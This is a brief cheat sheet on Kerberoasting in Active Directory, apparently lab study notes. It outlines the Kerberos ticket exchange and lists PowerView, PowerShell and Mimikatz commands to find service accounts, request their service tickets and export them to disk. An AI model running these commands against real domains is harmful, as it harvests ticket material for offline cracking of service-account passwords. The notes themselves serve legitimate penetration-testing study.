# Kerberoast

## Process

1. Password converted to NTLM hash, a timestamp is encrypted with the hash and sent to the KDC (AS-REQ)
2. The TGT is encrypted, signed, & delivered to the user (AS-REP). Only krbtgt can open and read TGT data
3. TGT encrypted with krbtgt hash when requesting a TGS ticket (TGS-REQ)
4. TGS encrypted using target service's NTLM hash (TGS-REP)
5. The user connects to the server hosting the service on the appropriate port & presents the TGS (AP-REQ)
6. Optional mutual Authentication

## How to find

| Info                    | Command                                                                                  |
| ----------------------- | ---------------------------------------------------------------------------------------- |
| PowerView               | `Get-NetUser -SPN`                                                                       |
| Active Directory Module | `Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName` |

## How to reguest a TGS

| Info                 | Command                                                                                                                               |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |
| Native PowerShell #1 | `Add-Type -Assembly System.IdentityModel`                                                                                             |
| Native PowerShell #2 | `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgm.dollarcorp.moneycorp.local"` |
| PowerView            | `Request-SPNTicket`                                                                                                                   |
| Confirm TGS recievew | `klist`                                                                                                                               |

## Export Ticket to disk

`Invoke-Mimikatz -Command '"kerberos::list /export"'`
